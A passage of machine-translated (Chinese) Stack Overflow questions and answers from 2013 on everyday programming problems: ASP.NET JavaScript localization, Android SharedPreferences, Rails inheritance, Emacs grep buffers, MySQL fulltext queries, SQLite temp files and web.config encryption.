        return Helpers.JavascriptResources(Resources.Client.ResourceManager,
            "Client", culture);
    }
} 
```

请注意，我添加了一个参数，为全局 javascript 对象提供您想要的任何名称。在上面的示例中，我可以在 JS 中访问这样的翻译：

```
alert(Client.Info_Message); 
```

现在调用这个脚本，我在默认模板中注册它（例如在`~/Shared/_layout.cshtml`）

```
<script type="text/javascript" src="~/resources/?lang=@(ViewBag.Language)"></script> 
```

为此，最好的方法是创建一个操作过滤器以自动在 ViewData 中输入语言。这可以这样做：

```
public class LanguageInViewBagAttribute : ActionFilterAttribute
{
    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        var controller = filterContext.Controller;
        if (controller != null)
            controller.ViewBag.Language = Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName;
    }
} 
```

然后，您可以在适用的情况下使用它来装饰控制器或操作，例如：

```
[LanguageInViewBag]
public class HomeController : Controller 
```

或注册为全局过滤器`/App_start/Filters.cs`

注意：我的实现假设您根据请求设置`Thread.CurrentThread.CurrentCulture`用户的文化。这样，actionfilter 就知道当前选择的语言。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-06-06T13:40:56.497

已经提到了所有解决方案，无论好坏。为了完成，我想提出另一个解决方案：不要在 Javascript 中设置文本。

将 Javascript 中的单词添加到不直接从服务器加载的页面中，就像您将 css 写入 html 文件一样。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-11-19T15:11:27.210

# 创建一个将您的资源集公开给 json 的操作

```
public class HomeController: Controller {

   [Route("localization.js")]
   public ActionResult Localization()
   {
       ResourceSet resourceSet = Globalization.Resources.ResourceManager.GetResourceSet(
                                       CultureInfo.CurrentUICulture, true, true);
       var result = resourceSet.Cast<DictionaryEntry>()
           .ToDictionary(x => x.Key.ToString(),
                    x => x.Value.ToString());

       return View((object)(JsonConvert.SerializeObject(result)));
   }

} 
```

# 添加`~/Views/Home/localization.cshtml`包含内容的文件

```
@model string
@{ 
    Layout = null;
}
var Resources = @Html.Raw(Model); 
```

# 在`Web.config`中，添加处理程序`localization.js`

```
 <system.webServer>
   <handlers>
     <add name="Localization" path="*/localization.js" verb="GET" type="System.Web.Handlers.TransferRequestHandler" preCondition="integratedMode,runtimeVersionv4.0" />
   </handlers>
 </system.webServer> 
```

### `_Layout.cshtml`在您或您要公开资源的任何地方调用操作

```
<script type="text/javascript">
    @(Html.Action("Localization", "Home"))
</script> 
```

## 结果

```
<script type="text/javascript">
    var Resources = {"HelloWorld" : "こんにちは世界", "NiceJob": "いいね！" };
    //Sample usage
    console.log(Resources.HelloWorld);
    console.log(Resources.NiceJob);
</script> 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-20T17:05:15.143

您可以使用 AJAX 和 JSON ActionResult 以更优雅的方式做到这一点。

```
<button />
<label for="gender"></label>

<script type="text/javascript">
    $("button").click(function () {
        $('label[for=gender]').load('@Url.Action("ResourceLabel", new { labelKey = "Gender" })');
    });
</script> 
```

和服务器端，大大简化，但你明白了：

```
public ContentResult ResourceLabel(string labelKey) {
    return Content(ResourceClass.GetString(labelKey));
} 
```

# mysql - mysqldump无法访问c盘

> ID：16122793
> 
> 赞同：0
> 
> 时间：2013-04-20T16:49:03.833
> 
> 标签：mysql

当我尝试将 mysqldump 用于 c 驱动器上的任何文件夹时，我收到错误访问被拒绝，但如果我将其转储到另一个驱动器，它可以正常工作。这是一台运行 Windows 8 64 位的新 PC，我是唯一的用户。

这可能是什么原因？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T18:18:48.340

您可以更改权限并授予对驱动器的访问权限，但不推荐！只需使用 Desktop 或 Documents 文件夹转储 sql。

# c++ - 写入文件 - 无效问题

> ID：16122794
> 
> 赞同：2
> 
> 时间：2013-04-20T16:49:16.133
> 
> 标签：c++

我有一个 void 类型函数向控制台显示几个整数。我希望将这些整数写入文件。这是我正在谈论的功能：

```
void inorder(node *root)
{
    if(root)
    {
        inorder(root->left);
        std::cout << root->key << " ";
        inorder(root->right);
    }
} 
```

我知道如果我返回整数数组就可以做到这一点。但这会使我的代码复杂化，我必须添加某种计数参数等。

是否可以将此函数的结果写入文件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:51:06.973

您可以简单地更改函数以获取对 an 的引用`std::ostream`，然后根据您是要写入文件还是标准输出，将其传递给`ofstream`or ：`std::cout`

```
void inorder(node *root, std::ostream& os)
{
  if(root)
  {
    inorder(root->left, os);
    os << root->key << " ";
    inorder(root->right, os);
  }
} 
```

然后

```
node* root = ....;

// write to stdout
inorder(root, std::cout);

// write to a file
std::ofstream myfile("myfile.txt");
inordet(root, myfile); 
```

# android - 再次保存、清除和保存 SharedPreferences

> ID：16122799
> 
> 赞同：0
> 
> 时间：2013-04-20T16:50:04.620
> 
> 标签：android, sharedpreferences

在我的应用程序中，一个活动包含厨房，它可以将所有图像按顺序存储在 SD 卡创建的名为 (saved_images) 的文件夹中，一切运行正常，**但**如果出于任何原因删除此文件夹 (saved_images)，然后再次打开应用程序并保存任何图像，应用程序将再次创建 (saved_images) 文件夹，但保存的图像编号仍会记住 SharedPreferences 值并将图像存储在续编号中。以前保存的已删除旧文件夹的图像，我的目标是获得以下内容：

**1-**必须清除从 SD 卡中自动删除的 (saved_images) 文件夹 SharedPreferences，如果再次创建 (saved_images) 文件夹，它会从头开始存储图像，即 image-1、image-2 等。

我尝试使用此代码清除 SharedPreferences 但它不起作用可能导致仅存储一个名为 image-1 的图像。

**2-**如果我将同一图像保存两次，但我只需要保存一次，当再次尝试保存时必须给出 Toast: 已保存。

这是我用来清除和恢复 SharedPreferences 的一段代码：

```
 View vi=convertView; 
    final ViewHolder holder; 
    if(convertView==null){ 
        vi = inflater.inflate(R.layout.gallery_items, null); 
        holder=new ViewHolder(); 
        holder.text=(TextView)vi.findViewById(R.id.textView1); 
        holder.image=(ImageView)vi.findViewById(R.id.image); 
        holder.button=(Button)vi.findViewById(R.id.button_save);

        holder.button.setOnClickListener(new OnClickListener() {

  private Bitmap bm;
public void onClick(View arg0) {
    String root = Environment.getExternalStorageDirectory().toString();
       File myDir = new File(root + "/saved_images");
       if(!myDir.exists()){
           myDir.mkdirs();
    bm = BitmapFactory.decodeResource( mContext.getResources(), images[itemPos]);
         holder.image.setImageBitmap(bm);
 SharedPreferences savedNumber = mContext.getSharedPreferences(PREFS_NAME, 0); 
        int lastSavedNumber = savedNumber.getInt("lastsavednumber",0); 
        lastSavedNumber++; 
        String fname = "Image-"+lastSavedNumber+".png"; 

        File file = new File (myDir, fname); 
        if (file.exists ()) {file.delete (); } 
        try { 
        FileOutputStream out = new FileOutputStream(file); 
             bm.compress(Bitmap.CompressFormat.PNG, 100, out);
        out.flush(); 
        out.close(); }
         catch (Exception e) { 
        e.printStackTrace(); }

        SharedPreferences saveNumber = mContext.getApplicationContext
                  ().getSharedPreferences(PREFS_NAME, 0); 
        SharedPreferences.Editor editorset = saveNumber.edit(); 
        editorset.putInt("lastsavednumber",lastSavedNumber); 
        editorset.commit();}

  else if(!myDir.delete()){
    SharedPreferences saveNumber1 = mContext.getApplicationContext
         ().getSharedPreferences(PREFS_NAME, 0); 
    SharedPreferences.Editor editor = saveNumber1.edit();
    editor.clear(); 
    editor.commit();

Toast.makeText(mContext, "saved", Toast.LENGTH_SHORT). show();}}});
      vi.setTag(holder);}

    else holder=(ViewHolder)vi.getTag(); 
    holder.text.setText(name[itemPos]); 

    final int stub_id=images[itemPos]; 
    holder.image.setImageResource(stub_id); 

    return vi; } 
```

这是原始代码，可以正常工作并按顺序存储所有图像

在 SD 卡文件夹中。

```
 View vi=convertView; 
    final ViewHolder holder; 
    if(convertView==null){ 
        vi = inflater.inflate(R.layout.gallery_items, null); 
        holder=new ViewHolder(); 
        holder.text=(TextView)vi.findViewById(R.id.textView1); 
        holder.image=(ImageView)vi.findViewById(R.id.image); 
        holder.button=(Button)vi.findViewById(R.id.button_save);

        holder.button.setOnClickListener(new OnClickListener() {

  private Bitmap bm;
  private String PREFS_NAME;
public void onClick(View arg0) {
       String root = Environment.getExternalStorageDirectory().toString();
       File myDir = new File(root + "/saved_images");
       if(!myDir.exists()){
           myDir.mkdirs();}
   bm = BitmapFactory.decodeResource( mContext.getResources(), images[itemPos]);
         holder.image.setImageBitmap(bm);
 SharedPreferences savedNumber = mContext.getSharedPreferences(PREFS_NAME, 0); 
        int lastSavedNumber = savedNumber.getInt("lastsavednumber",0); 
        lastSavedNumber++; 
        String fname = "Image-"+lastSavedNumber+".png"; 

        File file = new File (myDir, fname); 
        if (file.exists ()) {file.delete (); } 
        try { 
        FileOutputStream out = new FileOutputStream(file); 
        bm.compress(Bitmap.CompressFormat.PNG, 100, out); 
        out.flush(); 
        out.close(); }
         catch (Exception e) { 
        e.printStackTrace(); 
        } 

    SharedPreferences saveNumber = mContext.getApplicationContext 
                 ().getSharedPreferences(PREFS_NAME, 0); 
    SharedPreferences.Editor editorset = saveNumber.edit(); 
    editorset.putInt("lastsavednumber",lastSavedNumber); 
    editorset.commit();
  Toast.makeText(mContext, "saved", Toast.LENGTH_SHORT). show();}});

      vi.setTag(holder);}

    else holder=(ViewHolder)vi.getTag(); 
    holder.text.setText(name[itemPos]); 

    final int stub_id=images[itemPos]; 
    holder.image.setImageResource(stub_id); 

    return vi; } 
```

我知道有些东西丢失或以错误的方式应用，所以请任何帮助，我们将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T10:16:50.623

**对于问题 1**

删除文件夹时，您必须将 SharedPreferences 值设置为零。所以它将与您当前的代码一起使用，就像您预期的那样

```
if(!myDir.exists()){ 
myDir.mkdirs();
SharedPreferences saveNumber = mContext.getApplicationContext().getSharedPreferences(PREFS_NAME, 0); 
SharedPreferences.Editor editorset = saveNumber.edit(); 
editorset.putInt("lastsavednumber",0); 
editorset.commit();
} 
```

**对于问题 2** ，为图像的所有详细信息（包括已保存/未保存状态）创建一个数据库。

您不必将值存储在数组中，而是将其存储到数据库中。

在将图像保存到 sdcard 之前，您必须检查数据库的已保存/未保存状态。如果未保存，则您可以保存图像，并且您必须将数据库列状态更新为仅为该图像保存。所以下次当用户按下同一张图片时，你可以发现图片被保存了。您可以在哪里`Toast`保存图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T21:09:54.120

在您的原始代码中，您可以

```
...
int lastSavedNumber = savedNumber.getInt("lastsavednumber",0);
...
if(!myDir.exists())
{
       myDir.mkdirs();
       lastSavedNumber = 0; // reset counter
}
... 
```

# ruby-on-rails - Rails 活动模型继承

> ID：16122800
> 
> 赞同：0
> 
> 时间：2013-04-20T16:50:09.360
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, activerecord

我认为我想要完成的是多表继承，但我不确定如何正确实现它。

我想从一个`Device`包含所有常见字段（例如名称和启用）的基类开始。

```
class Device
  # in app/models
  # Fields
  #   String name
  #   boolean enabled
end 
```

然后我想为不同的设备类型创建抽象类，例如`Light`继承自`Device`

```
class Light < ActiveRecord:Base
  # in app/models
  # Fields
  #  String type

  include Device

  def on
    raise NotImplementedError
  end

  def off
    raise NotImplementedError
  end
end 
```

`X10Light`然后，我将拥有特定设备的类，例如`ZWaveLight`定义每个设备的细节并实现抽象方法的类。

```
class X10Light < Light
  # in app/models
  # Fields
  #   String serial_number

  def on
    # fully implemented on method
  end

  def off
    # fully implemented off method
  end
end 
```

我的目标是像下面这样使用它

```
light1 = X10Light.new
light1.serial_number = "x1"
light1.save

light2 = ZWaveLight.new
light2.serial_number = "z1"
light2.save

all_lights = Light.all
all_lights.each do |light|
  light.off
end 
```

我认为我计划事情的方式是可能的，但我认为有些实施不正确。我将不胜感激任何帮助解决这方面的细节。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:20:42.330

您可以使用单表继承，您需要创建一个模型，该模型`Device`将包含所有字段以及一个名为 的保留列`type`，其中 rails 将存储具体实例的类名。

```
rails g model Device type:string ... other fields (ie columns for device, light, x10light) ...

class Device < ActiveRecord:Base
  ...
end

class Light < Device
  ...
end

class X10Light < Light
  ...
end 
```

使用 STI 的缺点是您最终会得到一个包含继承树的所有列的表。

# emacs - 从 emacs 中的 rgrep/grep 输出中删除标头信息？

> ID：16122801
> 
> 赞同：8
> 
> 时间：2013-04-20T16:50:12.640
> 
> 标签：emacs, grep, elisp, emacs24

这是我运行时缓冲区的样子`rgrep`。我只想看看我的结果——所有其他信息对我来说毫无意义。

```
-*- mode: grep; default-directory: "~/.emacs/" -*-
Grep started at Sat Jan 20 12:42:21

grep  --exclude=.\#\* --exclude=\*.o --exclude=\*\~ --exclude=\*.bin --exclude=\*.lbin --exclude=\*.so --exclude=\*.a --exclude=\*.ln --exclude=\*.blg --exclude=\*.bbl --exclude=\*.elc --exclude=\*.lof --exclude=\*.glo --exclude=\*.idx --exclude=\*.lot --exclude=\*.fmt --exclude=\*.tfm --exclude=\*.class --exclude=\*.fas --exclude=\*.lib --exclude=\*.mem --exclude=\*.x86f --exclude=\*.sparcf --exclude=\*.dfsl --exclude=\*.pfsl --exclude=\*.d64fsl --exclude=\*.p64fsl --exclude=\*.lx64fsl --exclude=\*.lx32fsl --exclude=\*.dx64fsl --exclude=\*.dx32fsl --exclude=\*.fx64fsl --exclude=\*.fx32fsl --exclude=\*.sx64fsl --exclude=\*.sx32fsl --exclude=\*.wx64fsl --exclude=\*.wx32fsl --exclude=\*.fasl --exclude=\*.ufsl --exclude=\*.fsl --exclude=\*.dxl --exclude=\*.lo --exclude=\*.la --exclude=\*.gmo --exclude=\*.mo --exclude=\*.toc --exclude=\*.aux --exclude=\*.cp --exclude=\*.fn --exclude=\*.ky --exclude=\*.pg --exclude=\*.tp --exclude=\*.vr --exclude=\*.cps --exclude=\*.fns --exclude=\*.kys --exclude=\*.pgs --exclude=\*.tps --exclude=\*.vrs --exclude=\*.pyc --exclude=\*.pyo -i -nH -e grep *.el

    init.el:236:(global-set-key (kbd "s-f") 'rgrep)
    init.el:237:(global-set-key (kbd "C-f") 'lgrep)

Grep finished (matches found) at Sat Jan 20 12:42:21 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-21T16:40:42.773

标题插入隐藏在对`compilation-start`deep inside 的调用中`rgrep`。没有一种简单的方法可以阻止这些函数插入标题。但是你可以很容易地通过定义通知来隐藏缓冲区的前四行。

```
(defun delete-grep-header ()
  (save-excursion
    (with-current-buffer grep-last-buffer
      (goto-line 5)
      (narrow-to-region (point) (point-max)))))

(defadvice grep (after delete-grep-header activate) (delete-grep-header))
(defadvice rgrep (after delete-grep-header activate) (delete-grep-header)) 
```

稍后您可以使用 扩大以再次显示这些线条`C-x``n``w`。

如果您还想建议`lgrep`,`grep-find`和`zrgrep`，您可以将`defadvice`上面的宏替换为这样的程序化建议：

```
(defvar delete-grep-header-advice
  (ad-make-advice
   'delete-grep-header nil t
   '(advice lambda () (delete-grep-header))))

(defun add-delete-grep-header-advice (function)
  (ad-add-advice function delete-grep-header-advice 'after 'first)
  (ad-activate function))

(mapc 'add-delete-grep-header-advice
      '(grep lgrep grep-find rgrep zrgrep)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-04-27T15:19:36.067

Michael Hoffman 的一个小补充：我们可以在 grep 缓冲区中添加一个小按钮来切换隐藏文本：

```
(defmacro with-grep-buffer-writable (&rest body)
  `(save-excursion
     (with-current-buffer grep-last-buffer
       (setq buffer-read-only nil)
       ,@body
       (setq buffer-read-only t))))

(defun hide-grep-header (&rest ignored)
  "Hides (by narrowing) the first few lines of a grep buffer leaving only 
the results. Additionally, a button is created to toggle the lines."
  (with-grep-buffer-writable
   ;;HACK: If we (goto-line 5), the button is inserted *after* the results.
   (goto-line 4)
   (end-of-line)
   (insert "\n")
   (narrow-to-region (point) (point-max))
   (insert-text-button "(...)"
                       'help-echo "Toggle display of grep invocation"
                       'action #'click-show-grep-button)))

(defun click-hide-grep-button (button)
  (with-grep-buffer-writable
   (button-put button 'action #'click-show-grep-button)
   (narrow-to-region (button-start button) (point-max))))

(defun click-show-grep-button (button)
  (with-grep-buffer-writable
   (button-put button 'action #'click-hide-grep-button)
   (widen))
  ; HACK: goto-line won't have any effect because of save-excursion
  (with-current-buffer grep-last-buffer
    (goto-line 1)))

(advice-add 'grep :after #'hide-grep-header)
(advice-add 'rgrep :after #'hide-grep-header) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-07-04T18:08:20.533

```
(defun my/grep-fix ()
  (save-excursion
    (let ((inhibit-read-only t))
      (goto-line 4)
      (kill-whole-line))))

(add-hook 'grep-setup-hook 'my/grep-fix) 
```

这个解决方案：

*   适用于`next-error`（即，它不会跳过第一场比赛）；
*   保留包含根目录的标头；
*   在所有 grep 变体中无缝工作。

# python - 在 Python 中使用 Quartz.CoreGraphics 平滑滚动

> ID：16122814
> 
> 赞同：2
> 
> 时间：2013-04-20T16:51:33.137
> 
> 标签：python, scroll, quartz-graphics, smooth-scrolling

我正在使用[Quartz Event Services](https://developer.apple.com/library/mac/#documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html)发送鼠标滚轮事件，如下所示：

```
from Quartz.CoreGraphics import CGEventCreateScrollWheelEvent, CGEventPost, kCGHIDEventTap

def scroll_wheel_up(num_times):
    for _ in xrange(num_times):
        # Scroll up 1 pixel
        event = CGEventCreateScrollWheelEvent(None, 0, 1, 1)
        CGEventPost(kCGHIDEventTap, event) 
```

这可行，但非常不稳定 - 它会跳跃而不是滚动。

我尝试了一些方法来平滑它，比如向上滚动后以较慢的速度向下滚动。我还尝试“减慢”滚动速度：

```
def scroll_wheel_up(num_times):
    for i in xrange(1, num_times):
        multiplier = 1 - (float(i) / num_times)
        speed = 4 * multiplier
        event = CGEventCreateScrollWheelEvent(None, 0, 1, speed)
        CGEventPost(kCGHIDEventTap, event) 
```

两者都没有成功。有没有办法使用 Quartz 或 PyObjC 绑定以编程方式平滑滚动窗口？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:59:02.840

发布后我立即想到在滚动事件之间添加一个小延迟：

```
def scroll_wheel_up(num_times):
    for i in xrange(1, num_times):
        time.sleep(.005)
        multiplier = 1 - (float(i) / num_times)
        speed = 4 * multiplier
        event = CGEventCreateScrollWheelEvent(None, 0, 1, speed)
        CGEventPost(kCGHIDEventTap, event) 
```

这要顺畅得多，并且令我满意。如果有人有其他方法可以做到这一点，我很乐意听到它！

# mysql - 订单结果全文

> ID：16122816
> 
> 赞同：1
> 
> 时间：2013-04-20T16:51:44.580
> 
> 标签：mysql, sql

按照我的查询：

```
SELECT data1
FROM table1 t1
WHERE EXISTS (
SELECT id,
MATCH (
...
)
AGAINST (
...
) AS rank
FROM table2 t2
WHERE MATCH (
...
)
AGAINST (
....
)
) ORDER BY rank DESC 
```

问题是我不承认排名在哪里，实际上我看到以下消息：

> #1054 - 'order 子句'中的未知列 'rank'

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:34:41.740

您正在使用`WHERE EXISTS`和子查询。

```
SELECT data1 FROM table1 t1 WHERE EXISTS (
    SELECT id,
    MATCH (...) AGAINST (...) AS rank
    FROM table2 t2
    WHERE MATCH (...) AGAINST (...) 
) ORDER BY rank DESC 
```

在这种情况下，MySQL会[忽略](http://dev.mysql.com/doc/refman/5.1/en/exists-and-not-exists-subqueries.html)选定的字段。它也可以阅读：

```
SELECT data1 FROM table1 t1 WHERE EXISTS (
    SELECT 42
    FROM table2 t2
    WHERE MATCH (...) AGAINST (...) 
) ORDER BY rank DESC 
```

它的工作原理是一样的。

将`WHERE EXISTS`-subquery 视为返回一个布尔值，除了那个布尔值之外什么都没有。

如果您希望从 table2 计算排名，则必须将 a 添加`JOIN`到您的主查询（可能还有一个`GROUP BY`子句）。

**编辑：示例**

很可能您不需要该`WHERE EXISTS`子句。（您的问题太不具体，无法确定，所以这是标准情况）

```
SELECT t1.data1, MATCH (...) AGAINST (...) AS rank
FROM table1 t1 
JOIN table2 t2 ON (MATCH (...) AGAINST (...))
GROUP BY t1.id, t1.data, rank
ORDER BY rank DESC 
```

如果table2 中*最多只有一个*匹配行，则可以不使用该`GROUP BY`子句，只需进行直接连接

```
SELECT t1.data1, MATCH (...) AGAINST (...) AS rank
FROM table1 t1 
JOIN table2 t2 ON (MATCH (...) AGAINST (...))
ORDER BY rank DESC 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T17:55:28.000

在 SQL 语句中，您只能在主子`from`句中引用表/子查询中的列。您的子查询在`where`子句中。

您需要将其重写为`join`. 如果`id`在 table2 中是唯一的，这将起作用：

```
select data1
from table1 t1 join
     (SELECT id, MATCH (...) AGAINST (...) AS rank
      FROM table2 t2
      WHERE MATCH (...) AGAINST (....)
     ) t2
     on t1.id = t2.id
order by t2.rank 
```

否则，您需要考虑重复：

```
select distinct data1, rank
from table1 t1 join
     (SELECT id, MATCH (...) AGAINST (...) AS rank
      FROM table2 t2
      WHERE MATCH (...) AGAINST (....)
     ) t2
     on t1.id = t2.id
order by t2.rank 
```

# flash - ASC 2.0 是否识别 [Frame] 元数据标签（例如：对于 Preloader factoryClass）？

> ID：16122820
> 
> 赞同：6
> 
> 时间：2013-04-20T16:52:14.930
> 
> 标签：flash, compiler-construction, metadata, frame, mxmlc

我正在尝试在 AIR SDK 3.7 中使用新的 ASC2.0 编译器，但我似乎遇到了无法检测到我的预加载器类的问题。

如果我使用非 ASC2.0 编译器，它会识别并编译在 Main 类的 Frame 元数据标记中声明的 Preloader 类，如下所示：

```
[Frame(factoryClass = "Preloader")] 
```

但是一旦我用 ASC2.0 编译它，它就会忽略 Frame 元数据，只是尝试编译 Main 类并假设它必须是 Sprite / MovieClip 的子类（它不一定必须是预加载了 Frame 元数据标签），因此无法编译。

如果有人能证实这一点，那就太好了，我已经在这上面旋转了一段时间。谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-20T17:16:14.100

显然，它不再受支持。这里有一个类似的问题：

[ASC2.0 和 Frame 元标记](https://stackoverflow.com/questions/15722403/asc2-0-and-frame-metatag)

新的解决方案似乎是这样的：

**您必须手动添加数据的编译器参数`-frame`。**

但是，要使其正常工作，您必须将项目设置与`[Frame]`元数据技术稍有不同。

> 之前（当使用旧的`[Frame]`元数据技术时），您必须将 Main 类指定为 Document 类（然后它将编译主入口点并将其重定向到您指定的 Preloader 类）。

现在使用 ASC2.0，您将把**Preloader 类设置为 Document 类**。

以下是您必须设置的几件事：

*   您的**Preloader**类应该*扩展* **Movieclip**子类。
    （这使您的 Main 内容可以嵌入到*Frame #2*上）
*   将您的“Preloader.as”类（或者无论您如何称呼它）指定为 Document 类。
*   把这个**附加编译器参数**：
    `-frame=AnyFrameLabelYouWant,YourMainClass`
*   **此外，使用此附加编译器参数**添加 SWF 版本：（
    `-swf-version=18` 尽管我认为 17 也可以与 ASC2.0 一起使用......）
*   确保您在 IDE 中使用**ASC2.0 SDK**编译器！

**注意**：*现在我考虑了一下，也许可以注入`/** @mxmlc */`JavaDoc 注释以向编译器提供指令，但我还没有尝试过。这可能是 ASC2.0 编译器中缺少元数据支持的解决方法。（编辑：我试过一次，这个功能似乎只适用于 FlashDevelop 中的“构建”工具栏按钮，它只编译当前聚焦的文件）*

# ios - 影响工具栏的 NavigationControl 的 UIBarButtonItem 外观

> ID：16122822
> 
> 赞同：0
> 
> 时间：2013-04-20T16:52:22.990
> 
> 标签：ios, uinavigationcontroller, uitoolbar, uiappearance

我在 UINavigationController 中为 UIBarButtonItem 设置了 UIAppearance，如下所示：

```
[[UIBarButtonItem appearanceWhenContainedIn: [UINavigationController class],nil] setBackgroundImage:bimg forState:UIControlStateNormal barMetrics:UIBarMetricsDefault];
[[UIBarButtonItem appearanceWhenContainedIn: [UINavigationController class],nil] setTitlePositionAdjustment:UIOffsetMake(0, bimg.size.height*2) forBarMetrics:UIBarMetricsDefault]; 
```

但它似乎也影响了 UIToolBar 内的 UIBarButtonItems 。我想做的是，我在导航栏中有自定义按钮，但我在键盘上方使用 UIToolbar，我希望这些按钮保持 iOS 风格。

有没有办法恢复 UIAppearance？或者我可以在 UIToolbar 内显式设置 UIBarButtonItem 的 UIAppearance 以使用默认值吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T20:08:07.057

Use `UINavigationBar` instead of `UINavigationController`:

```
[[UIBarButtonItem appearanceWhenContainedIn:[UINavigationBar class],nil] setBackgroundImage:bimg forState:UIControlStateNormal barMetrics:UIBarMetricsDefault];
[[UIBarButtonItem appearanceWhenContainedIn:[UINavigationBar class],nil] setTitlePositionAdjustment:UIOffsetMake(0, bimg.size.height*2) forBarMetrics:UIBarMetricsDefault]; 
```

# database - 如何更改 sqlite 创建 etilqs 文件的临时文件夹？

> ID：16122824
> 
> 赞同：3
> 
> 时间：2013-04-20T16:52:47.430
> 
> 标签：database, apache, sqlite, temp

（这个问题是[如何避免 httpd.exe 在 C\WINDOWS\TEMP\ 中创建 etilqs 的衍生问题？](https://stackoverflow.com/questions/16121290/how-to-avoid-httpd-exe-from-creating-etilqs-in-c-windows-temp/16121977#16121977)）

我在我的计算机中安装了 Apache 2.4，并且使用了 localhost Web 应用程序。

这个应用程序使用了一个 sqlite 数据库（通过 PHP PDO），一开始它很小，但现在它有 66518 行。

有一段时间，当我跑

```
SELECT Z.A,B,C,D,(SELECT 1 FROM X WHERE X.A=Z.A AND X.E IS NOT NULL)
FROM Y,Z
Where F=:f AND Y.A=Z.A
ORDER BY D IS NULL DESC, D IS "" ASC, D DESC
LIMIT :startRow,24 
```

COMODO 防火墙的 Defense+ 模块警告我`http.exe`想要创建新的文件/文件夹`C:\WINDOWS\TEMP\etilqs_???`，其中 ??? 是随机数字和字母。

我认为这是因为数据库变大了（一开始我没有这个问题）。

COMODO 防火墙显示警告，因为`C:\WINDOWS`它是受保护的文件夹。然后，也许我可以更改文件夹，以便 sqlite 将这些文件存储在未受保护的文件中以避免警告。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T17:57:42.953

要更改临时目录，请更改`TEMP`和`TMP`环境变量的值。

根据您的 Windows 版本，您可能会在计算机 ➝ 属性 ➝ 高级 ➝ 环境变量下找到它们。

# c# - 加密 web.config 文件中的标签

> ID：16122829
> 
> 赞同：3
> 
> 时间：2013-04-20T16:53:44.580
> 
> 标签：c#, .net, encryption, key

我最近看到了这篇文章，它描述了在 web.config 文件中加密**connectionString标记的过程：**

[http://chiragrdarji.wordpress.com/2008/08/11/how-to-encrypt-connection-string-in-webconfig/](http://chiragrdarji.wordpress.com/2008/08/11/how-to-encrypt-connection-string-in-webconfig/)

我使用相同的方法来加密包含我的加密密钥的 web.config 文件中的**appSettings**标记。

我的问题是，如果我将项目交给将在另一台机器上运行它的其他人，他们是否能够使用反向过程使用 aspnet_regiis 工具解密 web.config 文件中的**appSettings标记？**如果没有，这个项目还能在他的机器上运行吗？

这就是我在代码中检索加密密钥的方式：

```
string block_size = ConfigurationManager.AppSettings["rgbIV"];
string encryption_key = ConfigurationManager.AppSettings["key"]; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T17:07:05.600

文档确认根据加密提供者我可能是对的：

[http://www.asp.net/web-forms/tutorials/data-access/advanced-data-access-scenarios/protecting-connection-strings-and-other-configuration-information-vb](http://www.asp.net/web-forms/tutorials/data-access/advanced-data-access-scenarios/protecting-connection-strings-and-other-configuration-information-vb)

> 注意：由于我们使用的是 DPAPI 提供程序，它使用特定于计算机的密钥，因此您必须从提供网页的同一台计算机上运行 aspnet_regiis.exe。例如，如果您从本地开发机器运行此命令行程序，然后将加密的 Web.config 文件上传到生产服务器，则生产服务器将无法解密连接字符串信息，因为它是使用特定于你的开发机器。RSA 提供程序没有此限制，因为可以将 RSA 密钥导出到另一台机器。

因此，对于 RSA，使用了一些密钥 - 如果没有这些密钥，第 3 方将拥有一堆无用的数据。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T17:48:15.320

有两种类型的加密：对称和非对称。

鉴于您发布了 web.config 的加密版本，对称加密实际上无法解密，因为它是特定于机器的（在一台机器上加密，只能在该特定机器上解密，甚至可以由特定用户解密）。

非对称加密 (RSA) 允许您安全地共享 web.config。如果您提供私钥，收件人将能够解密内容。如果您不共享私钥，那么除了随机垃圾之外几乎不可能得到任何东西。

# jquery - 如何启用和禁用为linkbutton申请的css

> ID：16122831
> 
> 赞同：0
> 
> 时间：2013-04-20T16:53:53.687
> 
> 标签：jquery, asp.net

我有 4 个链接按钮，我需要在其中更改 onclicked 的颜色

示例：ABCD

默认情况下，如果单击 B，则将 css 应用于 A 将其应用于 B.css 应用于 A 按钮应禁用。我需要服务器端或客户端的解决方案。

我需要服务器端的解决方案，因为我得到了更新的面板，并且我在后面的代码中调用了链接按钮文本

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T17:06:54.847

你的问题很模糊，不包含代码，但我会尽力而为。听起来您想在元素之间切换类。这可以实现如下：

ASP.NET

```
<asp:LinkButton ID="lbA" Text="A" OnClientClick="lbGroupClick" CssClass="lb active" runat= "server" />
<asp:LinkButton ID="lbB" Text="B" OnClientClick="lbGroupClick" CssClass="lb" runat= "server" />
<asp:LinkButton ID="lbC" Text="C" OnClientClick="lbGroupClick" CssClass="lb" runat= "server" />
<asp:LinkButton ID="lbD" Text="D" OnClientClick="lbGroupClick" CssClass="lb" runat= "server" /> 
```

Javascript

```
function lbGroupClick() {
    $('.lb.active').removeClass('active'); // remove from any current active ones
    $(this).addClass('active');
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T17:02:32.060

HTML

```
<div class="links-list">
    <a href="#" class="active">Link 1</a>
    <a href="#" >Link 2</a>
